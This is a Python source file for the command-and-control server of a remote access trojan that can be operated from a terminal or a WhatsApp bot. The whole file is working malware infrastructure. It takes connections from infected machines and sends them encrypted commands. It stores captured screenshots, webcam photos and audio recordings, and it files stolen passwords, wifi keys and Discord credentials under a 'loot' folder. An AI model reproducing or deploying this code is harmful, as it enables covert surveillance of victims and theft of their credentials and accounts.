"""
═══════════════════════════════════════════════════════════════
    ULTIMATE RAT C2 SERVER - WHATSAPP INTEGRATION
    Control targets via WhatsApp + Terminal
═══════════════════════════════════════════════════════════════
"""

import socket
import threading
import base64
import os
import signal
import sys
from cryptography.fernet import Fernet
from datetime import datetime
import time
from flask import Flask
from flask_socketio import SocketIO, emit

# ═══════════════════════════════════════════════════════════════
# FLASK + SOCKET.IO SETUP FOR WHATSAPP BRIDGE
# ═══════════════════════════════════════════════════════════════

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key-here'
socketio = SocketIO(app, cors_allowed_origins="*")

# ═══════════════════════════════════════════════════════════════
# GLOBAL SESSION MANAGEMENT
# ═══════════════════════════════════════════════════════════════

SESSIONS = {}
SESSION_LOCK = threading.Lock()
ACTIVE_SESSION = None
SERVER_RUNNING = True

class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

# ═══════════════════════════════════════════════════════════════
# ENCRYPTION FUNCTIONS
# ═══════════════════════════════════════════════════════════════

def encrypt_data(key, data):
    f = Fernet(key)
    return f.encrypt(data.encode())

def decrypt_data(key, data):
    f = Fernet(key)
    return f.decrypt(data).decode()

# ═══════════════════════════════════════════════════════════════
# FILE SAVING FUNCTIONS
# ═══════════════════════════════════════════════════════════════

def save_screenshot(data, client_name):
    try:
        os.makedirs('captures/screenshots', exist_ok=True)
        filename = f"captures/screenshots/screenshot_{client_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        with open(filename, 'wb') as f:
            f.write(base64.b64decode(data))
        return f"[+] Screenshot saved as {filename}"
    except Exception as e:
        return f"[-] Save failed: {str(e)}"

def save_webcam(data, client_name):
    try:
        os.makedirs('captures/webcam', exist_ok=True)
        filename = f"captures/webcam/webcam_{client_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
        with open(filename, 'wb') as f:
            f.write(base64.b64decode(data))
        return f"[+] Webcam image saved as {filename}"
    except Exception as e:
        return f"[-] Save failed: {str(e)}"

def save_audio(data, client_name):
    try:
        os.makedirs('captures/audio', exist_ok=True)
        filename = f"captures/audio/audio_{client_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
        with open(filename, 'wb') as f:
            f.write(base64.b64decode(data))
        return f"[+] Audio saved as {filename}"
    except Exception as e:
        return f"[-] Save failed: {str(e)}"

def save_credentials(data, client_name, cred_type):
    try:
        os.makedirs(f'loot/{client_name}', exist_ok=True)
        filename = f"loot/{client_name}/{cred_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            f.write(data)
        return f"[+] Credentials saved as {filename}"
    except Exception as e:
        return f"[-] Save failed: {str(e)}"

# ═══════════════════════════════════════════════════════════════
# SESSION MANAGEMENT
# ═══════════════════════════════════════════════════════════════

def add_session(session_id, client_socket, addr, info):
    with SESSION_LOCK:
        SESSIONS[session_id] = {
            'socket': client_socket,
            'addr': addr,
            'info': info,
            'connected_at': datetime.now().strftime('%H:%M:%S'),
            'active': True
        }
    print(f"{Colors.GREEN}[+] Session {session_id} added{Colors.END}")
    
    # Notify WhatsApp bot
    socketio.emit('new_session', {
        'id': session_id,
        'info': info,
        'addr': addr
    })

def remove_session(session_id):
    with SESSION_LOCK:
        if session_id in SESSIONS:
            try:
                SESSIONS[session_id]['socket'].close()
            except:
                pass
            del SESSIONS[session_id]
    print(f"{Colors.RED}[-] Session {session_id} removed{Colors.END}")

def list_sessions():
    with SESSION_LOCK:
        if not SESSIONS:
            print(f"{Colors.YELLOW}[*] No active sessions{Colors.END}")
            return
        
        print(f"\n{Colors.CYAN}{Colors.BOLD}╔══════════════════════════════════════════════════════════════╗")
        print(f"║                    ACTIVE SESSIONS                           ║")
        print(f"╚══════════════════════════════════════════════════════════════╝{Colors.END}\n")
        
        for sid, session in SESSIONS.items():
            addr = session['addr']
            info = session['info']
            connected_time = session['connected_at']
            active_marker = f"{Colors.GREEN}●{Colors.END}"
            
            print(f"{active_marker} {Colors.BOLD}[{sid}]{Colors.END} {addr[0]}:{addr[1]} | {info} | Connected: {connected_time}")
        
        print()

# ═══════════════════════════════════════════════════════════════
# SOCKET.IO HANDLERS FOR WHATSAPP
# ═══════════════════════════════════════════════════════════════

@socketio.on('connect')
def handle_connect():
    print(f"{Colors.GREEN}[+] WhatsApp bot connected{Colors.END}")

@socketio.on('disconnect')
def handle_disconnect():
    print(f"{Colors.YELLOW}[-] WhatsApp bot disconnected{Colors.END}")

@socketio.on('get_sessions')
def handle_get_sessions():
    with SESSION_LOCK:
        sessions_data = {}
        for sid, session in SESSIONS.items():
            sessions_data[sid] = {
                'info': session['info'],
                'addr': session['addr'],
                'connected_at': session['connected_at']
            }
        emit('sessions_list', sessions_data)

@socketio.on('execute_command')
def handle_execute_command(data):
    session_id = data['session']
    command = data['command']
    
    if session_id not in SESSIONS:
        emit('command_result', {'result': 'Session not found'})
        return
    
    print(f"{Colors.CYAN}[WhatsApp] Executing on session {session_id}: {command}{Colors.END}")
    
    # Execute command and get result
    result, error = send_command_sync(session_id, command)
    
    if error:
        emit('command_result', {'result': error})
        return
    
    # Handle special responses (images, audio)
    if command.lower() == 'screenshot':
        emit('command_result', {'image': result})
    elif command.lower() == 'webcam':
        emit('command_result', {'image': result})
    elif command.lower().startswith('record'):
        emit('command_result', {'audio': result})
    else:
        emit('command_result', {'result': result})

# ═══════════════════════════════════════════════════════════════
# COMMAND EXECUTOR
# ═══════════════════════════════════════════════════════════════

def send_command_sync(session_id, command, timeout=30):
    """Send command and wait for response"""
    if session_id not in SESSIONS:
        return None, "Session not found"
    
    client_socket = SESSIONS[session_id]['socket']
    KEY = b'HBotDwpxC89EIMiuA6PA_8NI81hWHqGC6hiG0DbfUDY='
    
    try:
        client_socket.send(encrypt_data(KEY, command))
        client_socket.settimeout(timeout)
        
        response_data = client_socket.recv(1024 * 1024)
        if not response_data:
            return None, "Connection closed"
        
        response = decrypt_data(KEY, response_data)
        
        # Handle multi-part responses (screenshot, webcam, audio)
        if command.lower() in ['screenshot', 'webcam'] and "Taking" in response or "Capturing" in response:
            response_data = client_socket.recv(10 * 1024 * 1024)
            response = decrypt_data(KEY, response_data)
        elif command.lower().startswith('record') and "Recording" in response:
            response_data = client_socket.recv(20 * 1024 * 1024)
            response = decrypt_data(KEY, response_data)
        
        return response, None
        
    except socket.timeout:
        return None, f"Command timed out after {timeout} seconds"
    except Exception as e:
        return None, f"Error: {str(e)}"

# ═══════════════════════════════════════════════════════════════
# CLIENT LISTENER THREAD
# ═══════════════════════════════════════════════════════════════

def client_listener(session_id, client_socket, key):
    try:
        while SERVER_RUNNING and session_id in SESSIONS:
            try:
                client_socket.settimeout(1.0)
                data = client_socket.recv(1024)
                if not data:
                    break
            except socket.timeout:
                continue
            except:
                break
    except:
        pass
    finally:
        remove_session(session_id)

# ═══════════════════════════════════════════════════════════════
# INTERACTIVE SHELL (Terminal)
# ═══════════════════════════════════════════════════════════════

def interactive_shell(session_id, key):
    global ACTIVE_SESSION
    
    if session_id not in SESSIONS:
        print(f"{Colors.RED}[-] Invalid session ID{Colors.END}")
        return
    
    session = SESSIONS[session_id]
    client_socket = session['socket']
    client_name = f"{session['addr'][0]}_{session['addr'][1]}"
    
    print(f"{Colors.GREEN}[*] Interacting with session {session_id}{Colors.END}")
    print(f"{Colors.YELLOW}[*] Type 'background' to return to main menu{Colors.END}\n")
    
    while True:
        try:
            if session_id not in SESSIONS:
                print(f"{Colors.RED}[-] Session disconnected{Colors.END}")
                ACTIVE_SESSION = None
                break
            
            command = input(f"{Colors.CYAN}{Colors.BOLD}RAT[{session_id}]>{Colors.END} ").strip()
            
            if not command:
                continue
            
            if command.lower() == 'background':
                ACTIVE_SESSION = None
                print(f"{Colors.YELLOW}[*] Backgrounded session {session_id}{Colors.END}")
                break
            
            elif command.lower() == 'clear':
                os.system('cls' if os.name == 'nt' else 'clear')
                continue
            
            # Send command
            response, error = send_command_sync(session_id, command)
            
            if error:
                print(f"{Colors.RED}[-] {error}{Colors.END}")
                continue
            
            # Handle special responses
            if command.lower() == 'screenshot':
                if not response.startswith('['):
                    print(save_screenshot(response, client_name))
                else:
                    print(response)
            elif command.lower() == 'webcam':
                if not response.startswith('['):
                    print(save_webcam(response, client_name))
                else:
                    print(response)
            elif command.lower().startswith('record'):
                if not response.startswith('['):
                    print(save_audio(response, client_name))
                else:
                    print(response)
            elif command.lower() in ['passwords', 'wifi', 'discord']:
                print(response)
                if not response.startswith('[-]'):
                    print(save_credentials(response, client_name, command.lower()))
            elif command.lower() == 'exit':
                remove_session(session_id)
                ACTIVE_SESSION = None
                break
            else:
                print(response)
        
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[*] Use 'background' to return or 'exit' to close session{Colors.END}")
            continue
        except Exception as e:
            print(f"{Colors.RED}[-] Error: {str(e)}{Colors.END}")

# ═══════════════════════════════════════════════════════════════
# CONNECTION HANDLER
# ═══════════════════════════════════════════════════════════════

def handle_new_connection(client_socket, key, addr):
    try:
        client_socket.settimeout(10)
        welcome_data = client_socket.recv(8192)
        welcome = decrypt_data(key, welcome_data)
        
        session_id = len(SESSIONS) + 1
        add_session(session_id, client_socket, addr, welcome)
        
        listener_thread = threading.Thread(
            target=client_listener,
            args=(session_id, client_socket, key),
            daemon=True
        )
        listener_thread.start()
        
        timestamp = datetime.now().strftime('%H:%M:%S')
        print(f"\n{Colors.GREEN}{Colors.BOLD}[{timestamp}] [Session {session_id}] {welcome}{Colors.END}")
        print(f"{Colors.YELLOW}[*] Use 'sessions' or control via WhatsApp{Colors.END}\n")
        
    except Exception as e:
        print(f"{Colors.RED}[-] Connection handler error: {str(e)}{Colors.END}")
        try:
            client_socket.close()
        except:
            pass

# ═══════════════════════════════════════════════════════════════
# SIGNAL HANDLER
# ═══════════════════════════════════════════════════════════════

def signal_handler(sig, frame):
    global SERVER_RUNNING
    print(f"\n{Colors.YELLOW}[*] Shutting down server...{Colors.END}")
    SERVER_RUNNING = False
    
    with SESSION_LOCK:
        for session_id in list(SESSIONS.keys()):
            try:
                SESSIONS[session_id]['socket'].close()
            except:
                pass
    
    print(f"{Colors.GREEN}[+] Server stopped{Colors.END}")
    sys.exit(0)

# ═══════════════════════════════════════════════════════════════
# MAIN SERVER
# ═══════════════════════════════════════════════════════════════

def main():
    global SERVER_RUNNING
    
    signal.signal(signal.SIGINT, signal_handler)
    
    KEY = b'HBotDwpxC89EIMiuA6PA_8NI81hWHqGC6hiG0DbfUDY='
    PORT = 4444
    
    banner = f"""{Colors.CYAN}{Colors.BOLD}
    ╔═══════════════════════════════════════════════════════════════════╗
    ║       ULTIMATE RAT C2 SERVER - WHATSAPP EDITION                   ║
    ║          Control Targets via WhatsApp + Terminal                  ║
    ╚═══════════════════════════════════════════════════════════════════╝
    {Colors.END}"""
    
    print(banner)
    
    os.makedirs('captures/screenshots', exist_ok=True)
    os.makedirs('captures/webcam', exist_ok=True)
    os.makedirs('captures/audio', exist_ok=True)
    os.makedirs('loot', exist_ok=True)
    
    # Start Socket.IO server in separate thread
    def run_socketio():
        socketio.run(app, host='0.0.0.0', port=5000, debug=False, use_reloader=False)
    
    socketio_thread = threading.Thread(target=run_socketio, daemon=True)
    socketio_thread.start()
    
    print(f"{Colors.GREEN}[*] Socket.IO server started on port 5000{Colors.END}")
    
    # Setup RAT server
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', PORT))
    server.listen(10)
    server.settimeout(1.0)
    
    print(f"{Colors.GREEN}[*] RAT server listening on port {PORT}{Colors.END}")
    print(f"{Colors.MAGENTA}[*] Start WhatsApp bot with: node whatsapp_bot.js{Colors.END}\n")
    
    # Start connection acceptor thread
    def accept_connections():
        while SERVER_RUNNING:
            try:
                client, addr = server.accept()
                threading.Thread(
                    target=handle_new_connection,
                    args=(client, KEY, addr),
                    daemon=True
                ).start()
            except socket.timeout:
                continue
            except:
                if SERVER_RUNNING:
                    continue
    
    acceptor_thread = threading.Thread(target=accept_connections, daemon=True)
    acceptor_thread.start()
    
    # Main command loop
    while SERVER_RUNNING:
        try:
            command = input(f"{Colors.MAGENTA}{Colors.BOLD}C2>{Colors.END} ").strip()
            
            if not command:
                continue
            
            if command.lower() == 'sessions':
                list_sessions()
            
            elif command.lower().startswith('use '):
                try:
                    session_id = int(command.split()[1])
                    interactive_shell(session_id, KEY)
                except:
                    print(f"{Colors.RED}[-] Usage: use <session_id>{Colors.END}")
            
            elif command.lower().startswith('kill '):
                try:
                    session_id = int(command.split()[1])
                    remove_session(session_id)
                    print(f"{Colors.GREEN}[+] Session {session_id} killed{Colors.END}")
                except:
                    print(f"{Colors.RED}[-] Usage: kill <session_id>{Colors.END}")
            
            elif command.lower() == 'clear':
                os.system('cls' if os.name == 'nt' else 'clear')
            
            elif command.lower() == 'exit':
                signal_handler(None, None)
            
            else:
                print(f"{Colors.RED}[-] Unknown command{Colors.END}")
        
        except Exception as e:
            print(f"{Colors.RED}[-] Error: {str(e)}{Colors.END}")

if __name__ == "__main__":
    main()